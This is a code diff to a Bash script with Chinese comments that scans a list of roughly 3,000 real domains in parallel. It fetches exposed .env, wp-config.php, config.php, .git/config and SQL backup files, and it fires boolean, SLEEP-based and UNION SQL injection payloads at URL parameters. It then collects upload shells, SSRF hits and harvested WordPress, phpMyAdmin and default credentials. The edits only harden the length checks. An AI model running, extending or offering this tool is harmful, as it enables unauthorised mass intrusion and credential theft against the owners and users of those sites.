@@ -3,12 +3,15 @@
 # 核心：五重验证 + 内容验证 + 智能并发 + 凭证复用
 
 source /root/.api_keys
+# 兼容Fofa API配置（FOFA_EMAIL或FOFA_EMAIL_1）
+[ -z "$FOFA_EMAIL_1" ] && [ -n "$FOFA_EMAIL" ] && export FOFA_EMAIL_1="$FOFA_EMAIL"
+[ -z "$FOFA_KEY_1" ] && [ -n "$FOFA_KEY" ] && export FOFA_KEY_1="$FOFA_KEY"
 PASS_DICT="/root/passwords/master_passwords.txt"
 TOP100="/root/passwords/top100.txt"
 DEFAULT_CREDS="/root/passwords/default_creds.txt"
 
 OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
-mkdir -p $OUT/shells $OUT/subdomains $OUT/alive
+mkdir -p $OUT/shells $OUT/subdomains $OUT/alive $OUT/shells/creds $OUT/shells/dicts
 
 # 主域名列表
 MAIN_DOMAINS="/root/ac_th_apex_domains_3071.txt"
@@ -192,7 +195,8 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     
     # .env文件（验证KEY=VALUE格式）
     env_resp=$(curl -skL -m 5 "$url/.env" 2>/dev/null)
-    if [ $(echo "$env_resp" | wc -c) -gt 50 ]; then
+    env_len=$(echo "$env_resp" | wc -c 2>/dev/null || echo 0)
+    if [ "$env_len" -gt 50 ]; then
         # 验证：包含KEY=VALUE格式，且不是HTML
         if [ -n "$env_resp" ] && echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && ! echo "$env_resp" | grep -qiE "<html|<body|<!DOCTYPE"; then
             # 验证：包含常见环境变量名
@@ -204,7 +208,8 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     
     # config.php（验证PHP语法）
     php_resp=$(curl -skL -m 5 "$url/config.php" 2>/dev/null)
-    if [ $(echo "$php_resp" | wc -c) -gt 100 ]; then
+    php_len=$(echo "$php_resp" | wc -c 2>/dev/null || echo 0)
+    if [ "$php_len" -gt 100 ]; then
         # 验证：包含PHP标签和配置
         if [ -n "$php_resp" ] && echo "$php_resp" | grep -qE "<?php" && echo "$php_resp" | grep -qiE "define|config|database|db_" && \
            ! echo "$php_resp" | grep -qiE "<html|<body|404|not found|forbidden"; then
@@ -214,7 +219,8 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     
     # wp-config.php（WordPress特定验证）
     wp_resp=$(curl -skL -m 5 "$url/wp-config.php" 2>/dev/null)
-    if [ -n "$wp_resp" ] && [ $(echo "$wp_resp" | wc -c) -gt 200 ]; then
+    wp_len=$(echo "$wp_resp" | wc -c 2>/dev/null || echo 0)
+    if [ -n "$wp_resp" ] && [ "$wp_len" -gt 200 ]; then
         if echo "$wp_resp" | grep -qE "<?php" && echo "$wp_resp" | grep -qiE "DB_NAME|DB_USER|DB_PASSWORD" && \
            ! echo "$wp_resp" | grep -qiE "<html|<body|404"; then
             echo "$url/wp-config.php" >> "$OUT"/shells/02_wpconfig.txt
@@ -223,7 +229,8 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     
     # .git/config（验证Git配置格式）
     git_resp=$(curl -skL -m 5 "$url/.git/config" 2>/dev/null)
-    if [ -n "$git_resp" ] && [ $(echo "$git_resp" | wc -c) -gt 50 ]; then
+    git_len=$(echo "$git_resp" | wc -c 2>/dev/null || echo 0)
+    if [ -n "$git_resp" ] && [ "$git_len" -gt 50 ]; then
         if echo "$git_resp" | grep -qE "\[.*\]" && echo "$git_resp" | grep -qiE "remote|url|branch" && \
            ! echo "$git_resp" | grep -qiE "<html|<body|404"; then
             echo "$url/.git/config" >> "$OUT"/shells/02_git.txt
@@ -256,7 +263,8 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                 # 验证3: 不是错误响应
                 if ! echo "$resp" | jq . | grep -qiE "error|unauthorized|forbidden|access denied"; then
                     # 验证4: 数据量足够（>200字符）
-                    if [ $(echo "$resp" | wc -c) -gt 200 ]; then
+                    resp_len=$(echo "$resp" | wc -c 2>/dev/null || echo 0)
+                    if [ "$resp_len" -gt 200 ]; then
                         echo "$url$api" >> "$OUT"/shells/03_api.txt
                         break
                     fi
@@ -388,7 +396,8 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                echo "$resp" | grep -qiE "Content-Type:.*application|Content-Type:.*text|Content-Type:.*sql|Content-Type:.*zip|Content-Type:.*tar"; then
                 # 验证：下载部分内容检查
                 content=$(curl -skL -m 5 "$url/${name}.${ext}" 2>/dev/null | head -c 500)
-                if [ $(echo "$content" | wc -c) -gt 100 ]; then
+                content_len=$(echo "$content" | wc -c 2>/dev/null || echo 0)
+                if [ "$content_len" -gt 100 ]; then
                     # SQL文件验证
                     if [ "${ext}" = "sql" ] && echo "$content" | grep -qiE "CREATE TABLE|INSERT INTO|DROP TABLE"; then
                         echo "$url/${name}.${ext}" >> "$OUT"/shells/08_backup.txt
@@ -635,8 +644,10 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             true_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\'' AND '\''1'\''='\''1" 2>/dev/null)
             false_resp=$(curl -skL -m 4 "${base_url}?${param}=1'\'' AND '\''1'\''='\''2" 2>/dev/null)
             
+            true_len=$(echo "$true_resp" | wc -c 2>/dev/null || echo 0)
+            false_len=$(echo "$false_resp" | wc -c 2>/dev/null || echo 0)
             if [ "$true_resp" != "$false_resp" ] && [ -n "$true_resp" ] && [ -n "$false_resp" ] && \
-               [ $(echo "$true_resp" | wc -c) -gt 100 ] && [ $(echo "$false_resp" | wc -c) -gt 100 ]; then
+               [ "$true_len" -gt 100 ] && [ "$false_len" -gt 100 ]; then
                 # 时间盲注验证
                 start=$(date +%s)
                 curl -skL -m 8 "${base_url}?${param}=1'\'' AND SLEEP(5)--" >/dev/null 2>&1
@@ -650,9 +661,10 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             
             # 联合查询检测
             union_resp=$(curl -skL -m 4 "${base_url}?${param}=1 UNION SELECT 1,2,3--" 2>/dev/null)
+            union_len=$(echo "$union_resp" | wc -c 2>/dev/null || echo 0)
             if echo "$union_resp" | grep -qE "[^0-9]2[^0-9]" && \
                ! echo "$union_resp" | grep -qiE "error|syntax|mysql error|sql error" && \
-               [ $(echo "$union_resp" | wc -c) -gt 100 ]; then
+               [ "$union_len" -gt 100 ]; then
                 echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> "$OUT/shells/13_sqli_union.txt"
                 break
             fi
@@ -805,16 +817,16 @@ echo "结果目录: $OUT/shells/"
 echo "字典目录: $OUT/shells/dicts/"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
-# 显示关键结果
-[ $UPLOAD -gt 0 ] && echo "" && echo "🚀 Upload Shell:" && cat $OUT/shells/01_upload.txt
-[ $ENV -gt 0 ] && echo "" && echo "📁 .env文件:" && head -10 $OUT/shells/02_env.txt
-[ $API -gt 0 ] && echo "" && echo "🌐 未授权API:" && head -10 $OUT/shells/03_api.txt
-[ $SSRF -gt 0 ] && echo "" && echo "🔗 SSRF:" && cat $OUT/shells/07_ssrf.txt
-[ $WP_CREDS -gt 0 ] && echo "" && echo "🔑 WordPress凭证:" && cat $OUT/shells/10_wp_creds.txt
-[ $PMA_CREDS -gt 0 ] && echo "" && echo "🔑 phpMyAdmin凭证:" && cat $OUT/shells/11_pma_creds.txt
-[ $DEFAULT_CREDS_COUNT -gt 0 ] && echo "" && echo "🔑 默认凭证:" && head -10 $OUT/shells/12_default_creds.txt
-[ $ENV_PASS -gt 0 ] && echo "" && echo "🔑 提取的密码:" && head -10 $OUT/shells/creds/env_passwords.txt
-[ $SQLI_TOTAL -gt 0 ] && echo "" && echo "💉 SQL注入:" && echo "  时间盲注:" && head -5 $OUT/shells/13_sqli_time.txt 2>/dev/null && \
+# 显示关键结果（修复：变量可能为空）
+[ -n "$UPLOAD" ] && [ "$UPLOAD" -gt 0 ] && echo "" && echo "🚀 Upload Shell:" && cat $OUT/shells/01_upload.txt
+[ -n "$ENV" ] && [ "$ENV" -gt 0 ] && echo "" && echo "📁 .env文件:" && head -10 $OUT/shells/02_env.txt
+[ -n "$API" ] && [ "$API" -gt 0 ] && echo "" && echo "🌐 未授权API:" && head -10 $OUT/shells/03_api.txt
+[ -n "$SSRF" ] && [ "$SSRF" -gt 0 ] && echo "" && echo "🔗 SSRF:" && cat $OUT/shells/07_ssrf.txt
+[ -n "$WP_CREDS" ] && [ "$WP_CREDS" -gt 0 ] && echo "" && echo "🔑 WordPress凭证:" && cat $OUT/shells/10_wp_creds.txt
+[ -n "$PMA_CREDS" ] && [ "$PMA_CREDS" -gt 0 ] && echo "" && echo "🔑 phpMyAdmin凭证:" && cat $OUT/shells/11_pma_creds.txt
+[ -n "$DEFAULT_CREDS_COUNT" ] && [ "$DEFAULT_CREDS_COUNT" -gt 0 ] && echo "" && echo "🔑 默认凭证:" && head -10 $OUT/shells/12_default_creds.txt
+[ -n "$ENV_PASS" ] && [ "$ENV_PASS" -gt 0 ] && echo "" && echo "🔑 提取的密码:" && head -10 $OUT/shells/creds/env_passwords.txt
+[ -n "$SQLI_TOTAL" ] && [ "$SQLI_TOTAL" -gt 0 ] && echo "" && echo "💉 SQL注入:" && echo "  时间盲注:" && head -5 $OUT/shells/13_sqli_time.txt 2>/dev/null && \
     echo "  报错注入:" && head -5 $OUT/shells/13_sqli_error.txt 2>/dev/null && \
     echo "  联合查询:" && head -5 $OUT/shells/13_sqli_union.txt 2>/dev/null
-[ $CRED_COUNT -gt 0 ] && echo "" && echo "📚 增强凭证字典:" && head -20 $OUT/shells/dicts/enhanced_creds.txt
+[ -n "$CRED_COUNT" ] && [ "$CRED_COUNT" -gt 0 ] && echo "" && echo "📚 增强凭证字典:" && head -20 $OUT/shells/dicts/enhanced_creds.txt
